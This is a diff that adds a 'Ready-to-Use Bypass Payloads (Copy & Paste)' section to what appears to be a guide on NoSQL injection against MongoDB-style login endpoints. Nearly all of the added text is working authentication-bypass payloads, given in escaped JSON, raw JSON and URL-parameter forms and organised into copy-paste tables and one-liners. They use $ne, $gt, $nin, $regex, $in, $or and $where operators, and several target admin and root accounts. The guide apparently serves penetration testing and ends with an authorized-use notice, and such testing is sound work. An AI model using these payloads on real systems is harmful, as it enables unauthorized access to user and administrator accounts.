@@ -339,6 +339,134 @@ if (typeof req.body.username !== 'string') {
 
 ---
 
+## 12. Ready-to-Use Bypass Payloads (Copy & Paste)
+
+### Escaped JSON Payloads (for Burp Suite, curl, etc.)
+
+**Basic bypass — match any non-empty value:**
+```
+{\"username\":{\"$ne\":\"\"},\"password\":{\"$ne\":\"\"}}
+```
+
+**Alternative — match anything not equal to "invalid":**
+```
+{\"username\":{\"$ne\":\"invalid\"},\"password\":{\"$ne\":\"invalid\"}}
+```
+
+**Using greater than (matches any string):**
+```
+{\"username\":{\"$gt\":\"\"},\"password\":{\"$gt\":\"\"}}
+```
+
+**Using not-in empty array:**
+```
+{\"username\":{\"$nin\":[]},\"password\":{\"$nin\":[]}}
+```
+
+**Target specific user, bypass password:**
+```
+{\"username\":\"admin\",\"password\":{\"$ne\":\"\"}}
+```
+
+**Using regex to match anything:**
+```
+{\"username\":{\"$regex\":\".*\"},\"password\":{\"$regex\":\".*\"}}
+```
+
+**Using $or for multiple conditions:**
+```
+{\"$or\":[{\"username\":\"admin\"},{\"username\":\"root\"}],\"password\":{\"$ne\":\"\"}}
+```
+
+**Using $where:**
+```
+{\"username\":\"admin\",\"password\":{\"$ne\":\"\"},\"$where\":\"return true\"}
+```
+
+### URL Parameter Payloads
+
+**Basic bypass:**
+```
+username[$ne]=&password[$ne]=
+```
+
+**Not equal to invalid:**
+```
+username[$ne]=invalid&password[$ne]=invalid
+```
+
+**Greater than empty:**
+```
+username[$gt]=&password[$gt]=
+```
+
+**Target admin:**
+```
+username=admin&password[$ne]=
+```
+
+**Using regex:**
+```
+username[$regex]=.*&password[$regex]=.*
+```
+
+**Using $in with multiple users:**
+```
+username[$in][0]=admin&username[$in][1]=root&password[$ne]=
+```
+
+### Single Field Bypass (Escaped)
+
+When you only need to bypass one field:
+
+| Purpose | Escaped JSON | URL |
+|---------|--------------|-----|
+| Not empty | `{\"$ne\":\"\"}` | `[$ne]=` |
+| Not invalid | `{\"$ne\":\"invalid\"}` | `[$ne]=invalid` |
+| Greater than | `{\"$gt\":\"\"}` | `[$gt]=` |
+| Exists | `{\"$exists\":true}` | `[$exists]=true` |
+| Regex any | `{\"$regex\":\".*\"}` | `[$regex]=.*` |
+| Not in empty | `{\"$nin\":[]}` | `[$nin]=` |
+
+### Quick Copy-Paste Table (Escaped)
+
+| Attack | Escaped JSON Payload |
+|--------|----------------------|
+| Login bypass (any user) | `{\"username\":{\"$ne\":\"\"},\"password\":{\"$ne\":\"\"}}` |
+| Login bypass (admin) | `{\"username\":\"admin\",\"password\":{\"$ne\":\"\"}}` |
+| Login bypass ($gt) | `{\"username\":{\"$gt\":\"\"},\"password\":{\"$gt\":\"\"}}` |
+| Login bypass ($regex) | `{\"username\":{\"$regex\":\".*\"},\"password\":{\"$regex\":\".*\"}}` |
+| Target admins ($in) | `{\"username\":{\"$in\":[\"admin\",\"root\",\"administrator\"]},\"password\":{\"$ne\":\"\"}}` |
+| Regex admin users | `{\"username\":{\"$regex\":\"admin\"},\"password\":{\"$ne\":\"\"}}` |
+| $where bypass | `{\"$where\":\"return true\"}` |
+
+### Minified One-Liners (Escaped — Ready to Use)
+
+```
+{\"username\":{\"$ne\":\"\"},\"password\":{\"$ne\":\"\"}}
+{\"username\":{\"$gt\":\"\"},\"password\":{\"$gt\":\"\"}}
+{\"username\":\"admin\",\"password\":{\"$ne\":\"\"}}
+{\"username\":{\"$regex\":\".*\"},\"password\":{\"$ne\":\"\"}}
+{\"username\":{\"$in\":[\"admin\",\"root\"]},\"password\":{\"$ne\":\"\"}}
+{\"$or\":[{\"username\":\"admin\"}],\"password\":{\"$ne\":\"\"}}
+{\"username\":{\"$nin\":[]},\"password\":{\"$nin\":[]}}
+{\"$where\":\"return true\"}
+```
+
+### Raw JSON (for tools that handle escaping automatically)
+
+If your tool handles JSON properly (like Postman or some scripts):
+
+```json
+{"username":{"$ne":""},"password":{"$ne":""}}
+{"username":{"$gt":""},"password":{"$gt":""}}
+{"username":"admin","password":{"$ne":""}}
+{"username":{"$regex":".*"},"password":{"$ne":""}}
+{"username":{"$in":["admin","root"]},"password":{"$ne":""}}
+```
+
+---
+
 ## ⚠️ Important Notes
 
 - Always test in authorized environments only
